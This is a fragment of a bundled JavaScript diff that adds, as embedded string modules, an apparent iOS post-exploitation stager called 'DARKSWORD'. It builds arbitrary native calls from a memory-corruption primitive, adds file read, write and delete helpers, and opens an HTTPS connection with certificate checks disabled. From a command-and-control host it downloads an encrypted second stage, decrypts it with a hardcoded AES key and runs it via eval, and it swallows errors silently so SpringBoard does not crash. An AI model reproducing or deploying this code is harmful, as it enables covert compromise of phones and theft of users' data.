view.getBigUint64(0, true);\n\t}\n\t\n\tstatic read32(ptr) {\n\t\tlet buff = this.read(ptr, 4);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getInt32(0, true);\n\t}\n\t\n\tstatic write64(ptr, value) {\n\t\tconst buff = new ArrayBuffer(8);\n\t\tconst view = new DataView(buff);\n\t\tview.setBigUint64(0, value, true);\n\t\tthis.write(ptr, buff);\n\t}\n\t\n\tstatic readString(ptr, len=1024) {\n\t\tlet buff = this.read(ptr, len);\n\t\treturn this.bytesToString(buff, false);\n\t}\n\t\n\tstatic writeString(ptr, str) {\n\t\tconst buff = this.stringToBytes(str, true);\n\t\tthis.write(ptr, buff);\n\t}\n\t\n\tstatic callSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\tthis.#argPtr = this.#argMem;\n\t\tx0 = this.#toNative(x0);\n\t\tx1 = this.#toNative(x1);\n\t\tx2 = this.#toNative(x2);\n\t\tx3 = this.#toNative(x3);\n\t\tx4 = this.#toNative(x4);\n\t\tx5 = this.#toNative(x5);\n\t\tx6 = this.#toNative(x6);\n\t\tx7 = this.#toNative(x7);\n\t\tlet ret = this.#nativeCallSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7);\n\t\t// Reset argPtr\n\t\tthis.#argPtr = this.#argMem;\n\t\treturn ret;\n\t}\n\n\tstatic bytesToString(bytes, includeNullChar=true) {\n\t\tlet bytes8 = new Uint8Array(bytes);\n\t\tlet str = \"\";\n\t\tfor (let i=0; i<bytes8.length; i++) {\n\t\t\tif (!includeNullChar && !bytes8[i])\n\t\t\t\tbreak;\n\t\t\tstr += String.fromCharCode(bytes8[i]);\n\t\t}\n\t\treturn str;\n\t}\n\t\n\tstatic stringToBytes(str, nullTerminated=false) {\n\t\tlet buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));\n\t\tlet s8 = new Uint8Array(buff);\n\t\tfor (let i=0; i<str.length; i++)\n\t\t\ts8[i] = str.charCodeAt(i);\n\t\tif (nullTerminated)\n\t\t\ts8[str.length] = 0x0;\n\t\treturn s8.buffer;\n\t}\n\t\n\tstatic #toNative(value) {\n\t\t// Strings need to be manually written to native memory\n\t\tif (!value)\n\t\t\treturn 0n;\n\t\tif (typeof value === 'string') {\n\t\t\tif (value.length >= 0x1000) {\n\t\t\t\treturn 0n;\n\t\t\t}\n\t\t\tlet ptr = this.#argPtr;\n\t\t\tthis.writeString(ptr, value);\n\t\t\tthis.#argPtr += BigInt(value.length + 1);\n\t\t\treturn ptr;\n\t\t}\n\t\telse if (typeof value === 'bigint') {\n\t\t\treturn value;\n\t\t}\n\t\telse\n\t\t\treturn BigInt(value);\n\t}\n\n\tstatic #dlsym(name) {\n\t\tif (!name)\n\t\t\treturn 0n;\n\t\tlet addr = this.#dlsymCache[name];\n\t\tif (addr)\n\t\t\treturn addr;\n\t\tconst RTLD_DEFAULT = 0xfffffffffffffffen;\n\t\tconst nameBytes = this.stringToBytes(name, true);\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tbuff8.set(new Uint8Array(nameBytes), 0x1000);\n\t\taddr = this.#nativeCallAddr(this.#dlsymAddr, RTLD_DEFAULT, this.#baseAddr + 0x1000n);\n\t\tif (addr)\n\t\t\tthis.#dlsymCache[name] = addr;\n\t\treturn addr;\n\t}\n\t\n\tstatic #nativeCallAddr(addr, x0=0n, x1=0n, x2=0n, x3=0n, x4=0n, x5=0n, x6=0n, x7=0n) {\n\t\tlet buff = new BigInt64Array(nativeCallBuff);\n\t\t\n\t\tbuff[0] = addr;\n\t\tbuff[100] = x0;\n\t\tbuff[101] = x1;\n\t\tbuff[102] = x2;\n\t\tbuff[103] = x3;\n\t\tbuff[104] = x4;\n\t\tbuff[105] = x5;\n\t\tbuff[106] = x6;\n\t\tbuff[107] = x7;\n\n\t\tinvoker();\n\t\t\n\t\treturn buff[200];\n\t}\n\t\n\tstatic #nativeCallSymbol(name, ...args) {\n\t\tconst funcAddr = this.#dlsym(name);\n\t\tconst ret64 = this.#nativeCallAddr(funcAddr, ...args);\n\t\tif (ret64 < 0xffffffffn && ret64 > -0xffffffffn)\n\t\t\treturn Number(ret64);\n\t\treturn ret64;\n\t}\n\n\tstatic malloc(size) {\n\t\treturn BigInt(this.callSymbol(\"malloc\", size));\n\t}\n\n\tstatic free(ptr) {\n\t\tthis.callSymbol(\"free\", ptr);\n\t}\n\n\tstatic dlsym(name) {\n\t\treturn BigInt(this.callSymbol(\"dlsym\", 0xfffffffffffffffen, name));\n\t}\n\n\tstatic dlopen(path) {\n\t\tthis.callSymbol(\"dlopen\", path, 1);\n\t}\n\n\tstatic readFile(path) {\n\t\tconst fd = Number(this.callSymbol(\"open\", path, 0));\n\t\tif (fd < 0) return null;\n\t\tconst statBuf = this.malloc(256);\n\t\tconst statResult = Number(this.callSymbol(\"fstat\", BigInt(fd), statBuf));\n\t\tlet fileSize = 0;\n\t\tif (statResult === 0) {\n\t\t\tconst buf = this.read(statBuf + 96n, 8);\n\t\t\tif (buf) fileSize = Number(new DataView(buf).getBigUint64(0, true));\n\t\t}\n\t\tthis.free(statBuf);\n\t\tif (fileSize <= 0 || fileSize > 10 * 1024 * 1024) {\n\t\t\tthis.callSymbol(\"close\", BigInt(fd));\n\t\t\treturn null;\n\t\t}\n\t\tconst buf = this.malloc(fileSize);\n\t\tconst bytesRead = Number(this.callSymbol(\"read\", BigInt(fd), buf, BigInt(fileSize)));\n\t\tthis.callSymbol(\"close\", BigInt(fd));\n\t\tif (bytesRead <= 0) { this.free(buf); return null; }\n\t\tconst data = this.read(buf, bytesRead);\n\t\tthis.free(buf);\n\t\treturn data ? new Uint8Array(data) : null;\n\t}\n\n\tstatic writeFile(path, data) {\n\t\tconst fd = Number(this.callSymbol(\"open\", path, 0x601, 0o666));\n\t\tif (fd < 0) return false;\n\t\tconst u8 = data instanceof Uint8Array ? data : new Uint8Array(data);\n\t\tconst ptr = this.malloc(u8.length);\n\t\tthis.write(ptr, u8.buffer);\n\t\tthis.callSymbol(\"write\", BigInt(fd), ptr, BigInt(u8.length));\n\t\tthis.callSymbol(\"close\", BigInt(fd));\n\t\tthis.free(ptr);\n\t\treturn true;\n\t}\n\n\tstatic fileExists(path) {\n\t\tconst result = Number(this.callSymbol(\"access\", path, 0));\n\t\treturn result === 0;\n\t}\n\n\tstatic unlink(path) {\n\t\tthis.callSymbol(\"unlink\", path);\n\t}\n\n\tstatic toCString(str) {\n\t\tconst ptr = this.callSymbol(\"malloc\", str.length + 1);\n\t\tthis.writeString(ptr, str);\n\t\treturn BigInt(ptr);\n\t}\n}\n\n// AES-ECB decrypt\nfunction aesDecrypt(encryptedBytes, keyHex) {\n\tNative.dlopen(\"/usr/lib/libcommonCrypto.dylib\");\n\n\tconst keyBytes = new Uint8Array(32);\n\tfor (let i = 0; i < 32; i++) {\n\t\tkeyBytes[i] = parseInt(keyHex.substr(i * 2, 2), 16);\n\t}\n\n\tconst kCCDecrypt = 1n;\n\tconst kCCAlgorithmAES = 0n;\n\tconst kCCOptionECBMode = 2n;\n\n\tconst inLen = encryptedBytes.length;\n\tconst outLen = inLen + 16;\n\tconst keyPtr = Native.malloc(32);\n\tconst inPtr = Native.malloc(inLen);\n\tconst outPtr = Native.malloc(outLen);\n\tconst movedPtr = Native.malloc(8);\n\tconst cryptorRefPtr = Native.malloc(8);\n\n\tNative.write(keyPtr, keyBytes.buffer);\n\tNative.write(inPtr, encryptedBytes.buffer);\n\tNative.write64(movedPtr, 0n);\n\tNative.write64(cryptorRefPtr, 0n);\n\n\tvar status = Native.callSymbol(\"CCCryptorCreate\",\n\t\tkCCDecrypt, kCCAlgorithmAES, kCCOptionECBMode,\n\t\tkeyPtr, 32n, 0n, cryptorRefPtr);\n\n\tvar decrypted = \"\";\n\n\tif (Number(status) === 0) {\n\t\tvar cryptorRef = Native.readPtr(cryptorRefPtr);\n\n\t\tNative.write64(movedPtr, 0n);\n\t\tNative.callSymbol(\"CCCryptorUpdate\",\n\t\t\tcryptorRef, inPtr, BigInt(inLen), outPtr, BigInt(outLen), movedPtr);\n\t\tvar updateMoved = Native.read32(movedPtr);\n\n\t\tNative.write64(movedPtr, 0n);\n\t\tNative.callSymbol(\"CCCryptorFinal\",\n\t\t\tcryptorRef, outPtr + BigInt(updateMoved), BigInt(outLen - updateMoved), movedPtr);\n\t\tvar finalMoved = Native.read32(movedPtr);\n\n\t\tvar totalMoved = updateMoved + finalMoved;\n\t\tif (totalMoved > 0) {\n\t\t\t// Remove PKCS7 padding\n\t\t\tvar rawBytes = new Uint8Array(Native.read(outPtr, totalMoved));\n\t\t\tvar padByte = rawBytes[totalMoved - 1];\n\t\t\tif (padByte > 0 && padByte <= 16) {\n\t\t\t\ttotalMoved -= padByte;\n\t\t\t}\n\t\t\tdecrypted = Native.bytesToString(Native.read(outPtr, totalMoved), false);\n\t\t}\n\n\t\tNative.callSymbol(\"CCCryptorRelease\", cryptorRef);\n\t}\n\n\tNative.free(keyPtr);\n\tNative.free(inPtr);\n\tNative.free(outPtr);\n\tNative.free(movedPtr);\n\tNative.free(cryptorRefPtr);\n\treturn decrypted;\n}\n\n// Helper: safely read/write 64-bit (matches original file_downloader pattern)\nfunction safeRead64(addr) {\n\tconst bytes = Native.read(addr, 8);\n\tif (!bytes || bytes.byteLength < 8) return 0n;\n\tconst view = new DataView(bytes);\n\tconst low = BigInt(view.getUint32(0, true));\n\tconst high = BigInt(view.getUint32(4, true));\n\treturn (high << 32n) | low;\n}\n\nfunction safeWrite64(addr, value) {\n\tconst buffer = new ArrayBuffer(8);\n\tconst view = new DataView(buffer);\n\tconst bigValue = BigInt(value);\n\tview.setUint32(0, Number(bigValue & 0xFFFFFFFFn), true);\n\tview.setUint32(4, Number((bigValue >> 32n) & 0xFFFFFFFFn), true);\n\tNative.write(addr, buffer);\n}\n\n// HTTPS GET via CFStream (same pattern as original sendFileViaHTTPS)\nfunction httpsGet(host, path, port) {\n\tNative.dlopen(\"/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation\");\n\tNative.dlopen(\"/System/Library/Frameworks/CFNetwork.framework/CFNetwork\");\n\n\t// Create CFString for host\n\tconst hostCStr = Native.callSymbol(\"malloc\", host.length + 1);\n\tNative.writeString(hostCStr, host);\n\tconst hostCFString = Native.callSymbol(\"CFStringCreateWithCString\", 0n, hostCStr, 0x08000100);\n\tNative.callSymbol(\"free\", hostCStr);\n\tif (!hostCFString) return null;\n\n\t// Create stream pair\n\tconst readStreamPtr = Native.callSymbol(\"malloc\", 8);\n\tconst writeStreamPtr = Native.callSymbol(\"malloc\", 8);\n\tsafeWrite64(readStreamPtr, 0n);\n\tsafeWrite64(writeStreamPtr, 0n);\n\n\tNative.callSymbol(\"CFStreamCreatePairWithSocketToHost\", 0n, hostCFString, port, readStreamPtr, writeStreamPtr);\n\n\tconst readStream = safeRead64(readStreamPtr);\n\tconst writeStream = safeRead64(writeStreamPtr);\n\tNative.callSymbol(\"CFRelease\", hostCFString);\n\tNative.callSymbol(\"free\", readStreamPtr);\n\tNative.callSymbol(\"free\", writeStreamPtr);\n\n\tif (!writeStream || writeStream === 0n) {\n\t\tif (readStream && readStream !== 0n) Native.callSymbol(\"CFRelease\", readStream);\n\t\treturn null;\n\t}\n\n\t// Set TLS/SSL on streams\n\tconst secLevelCStr = Native.callSymbol(\"malloc\", 64);\n\tNative.writeString(secLevelCStr, \"kCFStreamPropertySocketSecurityLevel\");\n\tconst kCFStreamPropertySocketSecurityLevel = Native.callSymbol(\"CFStringCreateWithCString\", 0n, secLevelCStr, 0x08000100);\n\tNative.callSymbol(\"free\", secLevelCStr);\n\n\tconst sslNegCStr = Native.callSymbol(\"malloc\", 64);\n\tNative.writeString(sslNegCStr, \"kCFStreamSocketSecurityLevelNegotiatedSSL\");\n\tconst kCFStreamSocketSecurityLevelNegotiatedSSL = Native.callSymbol(\"CFStringCreateWithCString\", 0n, sslNegCStr, 0x08000100);\n\tNative.callSymbol(\"free\", sslNegCStr);\n\n\tif (kCFStreamPropertySocketSecurityLevel && kCFStreamSocketSecurityLevelNegotiatedSSL) {\n\t\tNative.callSymbol(\"CFWriteStreamSetProperty\", writeStream, kCFStreamPropertySocketSecurityLevel, kCFStreamSocketSecurityLevelNegotiatedSSL);\n\t\tNative.callSymbol(\"CFReadStreamSetProperty\", readStream, kCFStreamPropertySocketSecurityLevel, kCFStreamSocketSecurityLevelNegotiatedSSL);\n\t}\n\n\t// Disable certificate validation\n\tconst sslSettingsCStr = Native.callSymbol(\"malloc\", 64);\n\tNative.writeString(sslSettingsCStr, \"kCFStreamPropertySSLSettings\");\n\tconst kCFStreamPropertySSLSettings = Native.callSymbol(\"CFStringCreateWithCString\", 0n, sslSettingsCStr, 0x08000100);\n\tNative.callSymbol(\"free\", sslSettingsCStr);\n\n\tconst validateCStr = Native.callSymbol(\"malloc\", 64);\n\tNative.writeString(validateCStr, \"kCFStreamSSLValidatesCertificateChain\");\n\tconst validateCertKey = Native.callSymbol(\"CFStringCreateWithCString\", 0n, validateCStr, 0x08000100);\n\tNative.callSymbol(\"free\", validateCStr);\n\n\tconst kCFBooleanFalse = Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFBooleanFalse\");\n\tconst kCFBooleanFalseValue = kCFBooleanFalse ? safeRead64(BigInt(kCFBooleanFalse)) : 0n;\n\n\tif (kCFStreamPropertySSLSettings && validateCertKey && kCFBooleanFalseValue && kCFBooleanFalseValue !== 0n) {\n\t\tconst keysArray = Native.callSymbol(\"malloc\", 8);\n\t\tconst valuesArray = Native.callSymbol(\"malloc\", 8);\n\t\tsafeWrite64(keysArray, BigInt(validateCertKey));\n\t\tsafeWrite64(valuesArray, kCFBooleanFalseValue);\n\n\t\tconst kCFTypeDictionaryKeyCallBacks = Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFTypeDictionaryKeyCallBacks\");\n\t\tconst kCFTypeDictionaryValueCallBacks = Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFTypeDictionaryValueCallBacks\");\n\n\t\tif (kCFTypeDictionaryKeyCallBacks && kCFTypeDictionaryValueCallBacks) {\n\t\t\tconst sslSettings = Native.callSymbol(\"CFDictionaryCreate\", 0n, keysArray, valuesArray, 1,\n\t\t\t\tkCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks);\n\t\t\tif (sslSettings) {\n\t\t\t\tNative.callSymbol(\"CFWriteStreamSetProperty\", writeStream, kCFStreamPropertySSLSettings, sslSettings);\n\t\t\t\tNative.callSymbol(\"CFReadStreamSetProperty\", readStream, kCFStreamPropertySSLSettings, sslSettings);\n\t\t\t\tNative.callSymbol(\"CFRelease\", sslSettings);\n\t\t\t}\n\t\t}\n\t\tNative.callSymbol(\"free\", keysArray);\n\t\tNative.callSymbol(\"free\", valuesArray);\n\t}\n\n\tif (validateCertKey) Native.callSymbol(\"CFRelease\", validateCertKey);\n\tif (kCFStreamPropertySocketSecurityLevel) Native.callSymbol(\"CFRelease\", kCFStreamPropertySocketSecurityLevel);\n\tif (kCFStreamSocketSecurityLevelNegotiatedSSL) Native.callSymbol(\"CFRelease\", kCFStreamSocketSecurityLevelNegotiatedSSL);\n\tif (kCFStreamPropertySSLSettings) Native.callSymbol(\"CFRelease\", kCFStreamPropertySSLSettings);\n\n\t// Open streams\n\tNative.callSymbol(\"CFReadStreamOpen\", readStream);\n\tconst writeOpened = Native.callSymbol(\"CFWriteStreamOpen\", writeStream);\n\tif (!writeOpened) {\n\t\tNative.callSymbol(\"CFRelease\", readStream);\n\t\tNative.callSymbol(\"CFRelease\", writeStream);\n\t\treturn null;\n\t}\n\n\t// Wait for stream ready (TLS handshake)\n\tlet streamReady = false;\n\tfor (let i = 0; i < 100; i++) {\n\t\tconst status = Number(Native.callSymbol(\"CFWriteStreamGetStatus\", writeStream));\n\t\tif (status === 2) { streamReady = true; break; }\n\t\tif (status >= 5) break;\n\t\tNative.callSymbol(\"usleep\", 100000);\n\t}\n\tif (!streamReady) {\n\t\tNative.callSymbol(\"CFReadStreamClose\", readStream);\n\t\tNative.callSymbol(\"CFWriteStreamClose\", writeStream);\n\t\tNative.callSymbol(\"CFRelease\", readStream);\n\t\tNative.callSymbol(\"CFRelease\", writeStream);\n\t\treturn null;\n\t}\n\n\t// Send HTTP GET request\n\tconst request = \"GET \" + path + \" HTTP/1.1\\r\\nHost: \" + host + \"\\r\\nConnection: close\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\";\n\tconst reqBuf = Native.callSymbol(\"malloc\", request.length + 1);\n\tNative.writeString(reqBuf, request);\n\tlet totalWritten = 0;\n\tconst reqLen = request.length;\n\twhile (totalWritten < reqLen) {\n\t\tconst written = Number(Native.callSymbol(\"CFWriteStreamWrite\", writeStream, reqBuf + BigInt(totalWritten), reqLen - totalWritten));\n\t\tif (written < 0) break;\n\t\tif (written === 0) { Native.callSymbol(\"usleep\", 10000); continue; }\n\t\ttotalWritten += written;\n\t}\n\tNative.callSymbol(\"free\", reqBuf);\n\n\t// Read response\n\tconst bufSize = 8192;\n\tconst readBuf = Native.callSymbol(\"malloc\", bufSize);\n\tlet responseBytes = [];\n\tlet totalRead = 0;\n\tconst maxSize = 5 * 1024 * 1024;\n\tconst readStart = Date.now();\n\tconst readTimeout = 60000;\n\n\twhile (totalRead < maxSize) {\n\t\tif (Date.now() - readStart > readTimeout) break;\n\t\tconst bytesRead = Number(Native.callSymbol(\"CFReadStreamRead\", readStream, readBuf, bufSize));\n\t\tif (bytesRead <= 0) break;\n\t\tconst chunk = Native.read(readBuf, bytesRead);\n\t\tif (chunk) responseBytes.push(new Uint8Array(chunk));\n\t\ttotalRead += bytesRead;\n\t}\n\n\tNative.callSymbol(\"free\", readBuf);\n\tNative.callSymbol(\"CFReadStreamClose\", readStream);\n\tNative.callSymbol(\"CFWriteStreamClose\", writeStream);\n\tNative.callSymbol(\"CFRelease\", readStream);\n\tNative.callSymbol(\"CFRelease\", writeStream);\n\n\tif (responseBytes.length === 0) return null;\n\n\t// Combine chunks\n\tlet combined = new Uint8Array(totalRead);\n\tlet offset = 0;\n\tfor (let chunk of responseBytes) {\n\t\tcombined.set(chunk, offset);\n\t\toffset += chunk.length;\n\t}\n\n\t// Parse HTTP response - find body after \\r\\n\\r\\n\n\tlet headerEnd = -1;\n\tfor (let i = 0; i < combined.length - 3; i++) {\n\t\tif (combined[i] === 13 && combined[i+1] === 10 && combined[i+2] === 13 && combined[i+3] === 10) {\n\t\t\theaderEnd = i + 4;\n\t\t\tbreak;\n\t\t}\n\t}\n\tif (headerEnd === -1) return null;\n\n\tconst headerStr = Native.bytesToString(combined.slice(0, Math.min(headerEnd, 256)).buffer, false);\n\tif (!headerStr.includes(\" 200 \")) return null;\n\n\treturn combined.slice(headerEnd);\n}\n\n// Main download + decrypt + eval\n(function() {\n\ttry {\n\t\tNative.init();\n\n\t\t// CC and CD are injected by ds_pe.js start() as prefix variables\n\t\tlet host = CD;\n\t\tlet port = 443;\n\t\tif (host.indexOf(\":\") !== -1) {\n\t\t\tconst parts = host.split(\":\");\n\t\t\thost = parts[0];\n\t\t\tport = parseInt(parts[1]) || 443;\n\t\t}\n\n\t\tconst path = \"/extract.js.enc\";\n\t\tconst maxRetries = 3;\n\n\t\tlet responseBody = null;\n\t\tfor (let attempt = 0; attempt < maxRetries; attempt++) {\n\t\t\ttry {\n\t\t\t\tresponseBody = httpsGet(host, path, port);\n\t\t\t\tif (responseBody && responseBody.length > 0) break;\n\t\t\t} catch(e) {}\n\t\t\tif (attempt < maxRetries - 1) {\n\t\t\t\tNative.callSymbol(\"usleep\", 2000000); // 2s\n\t\t\t}\n\t\t}\n\n\t\tif (!responseBody || responseBody.length === 0) return;\n\n\t\tconst decrypted = aesDecrypt(responseBody, DARKSWORD_PAYLOAD_KEY);\n\t\tif (decrypted && decrypted.length > 0) eval(decrypted);\n\n\t} catch(e) {\n\t\t// Silent - don't crash SpringBoard\n\t}\n})();\n");
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
+ });
+ const __WEBPACK_DEFAULT_EXPORT__ = ("\n\n\n\nconst DARKSWORD_PAYLOAD_KEY = \"4d93a741d457e9bc48e62055ddec23a56a3f8ba1f1e317957b469b43700b784b\";\n\n\n\n\n\nclass Native {\n\t\n\tstatic #baseAddr;\n\tstatic #dlsymAddr;\n\tstatic #memcpyAddr;\n\tstatic #mallocAddr;\n\tstatic #oinvAddr;\n\t\n\t\n\tstatic mem = 0n;\n\tstatic memSize = 0x4000;\n\t\n\t\n\tstatic #argMem = 0n;\n\tstatic #argMemPtr = 0n;\n\tstatic #argMemPtrStr = 0n;\n\t\n\t\n\tstatic #argPtr = 0n;\n\tstatic #argPtrPtr = 0n;\n\tstatic #argPtrStrPtr = 0n;\n\n\tstatic #dlsymCache = {};\n\t\n\tstatic init() {\n\t\tconst buff = new BigUint64Array(nativeCallBuff);\n\t\tthis.#baseAddr = buff[20];\n\t\tthis.#dlsymAddr = buff[21];\n\t\tthis.#memcpyAddr = buff[22];\n\t\tthis.#mallocAddr = buff[23];\n\t\tthis.#oinvAddr = buff[24];\n\t\t\n\t\tthis.mem = this.#nativeCallAddr(this.#mallocAddr, BigInt(this.memSize));\n\t\tthis.#argMem = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argMemPtr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argMemPtrStr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argPtr = this.#argMem;\n\t\tthis.#argPtrPtr = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr = this.#argMemPtrStr;\n\t}\n\t\n\tstatic write(ptr, buff) {\n\t\tif (!ptr)\n\t\t\treturn false;\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tlet offs = 0;\n\t\tlet left = buff.byteLength;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000)\n\t\t\t\tlen = 0x1000;\n\t\t\tbuff8.set(new Uint8Array(buff, offs, len), 0x1000);\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, ptr + BigInt(offs), this.#baseAddr + 0x1000n, BigInt(len));\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn true;\n\t}\n\t\n\tstatic read(ptr, length) {\n\t\tif (!ptr)\n\t\t\treturn null;\n\t\tlet buff = new ArrayBuffer(length);\n\t\tlet buff8 = new Uint8Array(buff);\n\t\tlet offs = 0;\n\t\tlet left = length;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000)\n\t\t\t\tlen = 0x1000;\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, this.#baseAddr + 0x1000n, ptr + BigInt(offs), BigInt(len));\n\t\t\tbuff8.set(new Uint8Array(nativeCallBuff, 0x1000, len), offs);\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn buff;\n\t}\n\t\n\tstatic readPtr(ptr) {\n\t\tlet buff = this.read(ptr, 8);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getBigUint64(0, true);\n\t}\n\t\n\tstatic read32(ptr) {\n\t\tlet buff = this.read(ptr, 4);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getInt32(0, true);\n\t}\n\t\n\tstatic write64(ptr, value) {\n\t\tconst buff = new ArrayBuffer(8);\n\t\tconst view = new DataView(buff);\n\t\tview.setBigUint64(0, value, true);\n\t\tthis.write(ptr, buff);\n\t}\n\t\n\tstatic readString(ptr, len=1024) {\n\t\tlet buff = this.read(ptr, len);\n\t\treturn this.bytesToString(buff, false);\n\t}\n\t\n\tstatic writeString(ptr, str) {\n\t\tconst buff = this.stringToBytes(str, true);\n\t\tthis.write(ptr, buff);\n\t}\n\t\n\tstatic callSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\tthis.#argPtr = this.#argMem;\n\t\tx0 = this.#toNative(x0);\n\t\tx1 = this.#toNative(x1);\n\t\tx2 = this.#toNative(x2);\n\t\tx3 = this.#toNative(x3);\n\t\tx4 = this.#toNative(x4);\n\t\tx5 = this.#toNative(x5);\n\t\tx6 = this.#toNative(x6);\n\t\tx7 = this.#toNative(x7);\n\t\tlet ret = this.#nativeCallSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7);\n\t\t\n\t\tthis.#argPtr = this.#argMem;\n\t\treturn ret;\n\t}\n\n\tstatic bytesToString(bytes, includeNullChar=true) {\n\t\tlet bytes8 = new Uint8Array(bytes);\n\t\tlet str = \"\";\n\t\tfor (let i=0; i<bytes8.length; i++) {\n\t\t\tif (!includeNullChar && !bytes8[i])\n\t\t\t\tbreak;\n\t\t\tstr += String.fromCharCode(bytes8[i]);\n\t\t}\n\t\treturn str;\n\t}\n\t\n\tstatic stringToBytes(str, nullTerminated=false) {\n\t\tlet buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));\n\t\tlet s8 = new Uint8Array(buff);\n\t\tfor (let i=0; i<str.length; i++)\n\t\t\ts8[i] = str.charCodeAt(i);\n\t\tif (nullTerminated)\n\t\t\ts8[str.length] = 0x0;\n\t\treturn s8.buffer;\n\t}\n\t\n\tstatic #toNative(value) {\n\t\t\n\t\tif (!value)\n\t\t\treturn 0n;\n\t\tif (typeof value === 'string') {\n\t\t\tif (value.length >= 0x1000) {\n\t\t\t\treturn 0n;\n\t\t\t}\n\t\t\tlet ptr = this.#argPtr;\n\t\t\tthis.writeString(ptr, value);\n\t\t\tthis.#argPtr += BigInt(value.length + 1);\n\t\t\treturn ptr;\n\t\t}\n\t\telse if (typeof value === 'bigint') {\n\t\t\treturn value;\n\t\t}\n\t\telse\n\t\t\treturn BigInt(value);\n\t}\n\n\tstatic #dlsym(name) {\n\t\tif (!name)\n\t\t\treturn 0n;\n\t\tlet addr = this.#dlsymCache[name];\n\t\tif (addr)\n\t\t\treturn addr;\n\t\tconst RTLD_DEFAULT = 0xfffffffffffffffen;\n\t\tconst nameBytes = this.stringToBytes(name, true);\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tbuff8.set(new Uint8Array(nameBytes), 0x1000);\n\t\taddr = this.#nativeCallAddr(this.#dlsymAddr, RTLD_DEFAULT, this.#baseAddr + 0x1000n);\n\t\tif (addr)\n\t\t\tthis.#dlsymCache[name] = addr;\n\t\treturn addr;\n\t}\n\t\n\tstatic #nativeCallAddr(addr, x0=0n, x1=0n, x2=0n, x3=0n, x4=0n, x5=0n, x6=0n, x7=0n) {\n\t\tlet buff = new BigInt64Array(nativeCallBuff);\n\t\t\n\t\tbuff[0] = addr;\n\t\tbuff[100] = x0;\n\t\tbuff[101] = x1;\n\t\tbuff[102] = x2;\n\t\tbuff[103] = x3;\n\t\tbuff[104] = x4;\n\t\tbuff[105] = x5;\n\t\tbuff[106] = x6;\n\t\tbuff[107] = x7;\n\n\t\tinvoker();\n\t\t\n\t\treturn buff[200];\n\t}\n\t\n\tstatic #nativeCallSymbol(name, ...args) {\n\t\tconst funcAddr = this.#dlsym(name);\n\t\tconst ret64 = this.#nativeCallAddr(funcAddr, ...args);\n\t\tif (ret64 < 0xffffffffn && ret64 > -0xffffffffn)\n\t\t\treturn Number(ret64);\n\t\treturn ret64;\n\t}\n\n\tstatic malloc(size) {\n\t\treturn BigInt(this.callSymbol(\"malloc\", size));\n\t}\n\n\tstatic free(ptr) {\n\t\tthis.callSymbol(\"free\", ptr);\n\t}\n\n\tstatic dlsym(name) {\n\t\treturn BigInt(this.callSymbol(\"dlsym\", 0xfffffffffffffffen, name));\n\t}\n\n\tstatic dlopen(path) {\n\t\tthis.callSymbol(\"dlopen\", path, 1);\n\t}\n\n\tstatic readFile(path) {\n\t\tconst fd = Number(this.callSymbol(\"open\", path, 0));\n\t\tif (fd < 0) return null;\n\t\tconst statBuf = this.malloc(256);\n\t\tconst statResult = Number(this.callSymbol(\"fstat\", BigInt(fd), statBuf));\n\t\tlet fileSize = 0;\n\t\tif (statResult === 0) {\n\t\t\tconst buf = this.read(statBuf + 96n, 8);\n\t\t\tif (buf) fileSize = Number(new DataView(buf).getBigUint64(0, true));\n\t\t}\n\t\tthis.free(statBuf);\n\t\tif (fileSize <= 0 || fileSize > 10 * 1024 * 1024) {\n\t\t\tthis.callSymbol(\"close\", BigInt(fd));\n\t\t\treturn null;\n\t\t}\n\t\tconst buf = this.malloc(fileSize);\n\t\tconst bytesRead = Number(this.callSymbol(\"read\", BigInt(fd), buf, BigInt(fileSize)));\n\t\tthis.callSymbol(\"close\", BigInt(fd));\n\t\tif (bytesRead <= 0) { this.free(buf); return null; }\n\t\tconst data = this.read(buf, bytesRead);\n\t\tthis.free(buf);\n\t\treturn data ? new Uint8Array(data) : null;\n\t}\n\n\tstatic writeFile(path, data) {\n\t\tconst fd = Number(this.callSymbol(\"open\", path, 0x601, 0o666));\n\t\tif (fd < 0) return false;\n\t\tconst u8 = data instanceof Uint8Array ? data : new Uint8Array(data);\n\t\tconst ptr = this.malloc(u8.length);\n\t\tthis.write(ptr, u8.buffer);\n\t\tthis.callSymbol(\"write\", BigInt(fd), ptr, BigInt(u8.length));\n\t\tthis.callSymbol(\"close\", BigInt(fd));\n\t\tthis.free(ptr);\n\t\treturn true;\n\t}\n\n\tstatic fileExists(path) {\n\t\tconst result = Number(this.callSymbol(\"access\", path, 0));\n\t\treturn result === 0;\n\t}\n\n\tstatic unlink(path) {\n\t\tthis.callSymbol(\"unlink\", path);\n\t}\n\n\tstatic toCString(str) {\n\t\tconst ptr = this.callSymbol(\"malloc\", str.length + 1);\n\t\tthis.writeString(ptr, str);\n\t\treturn 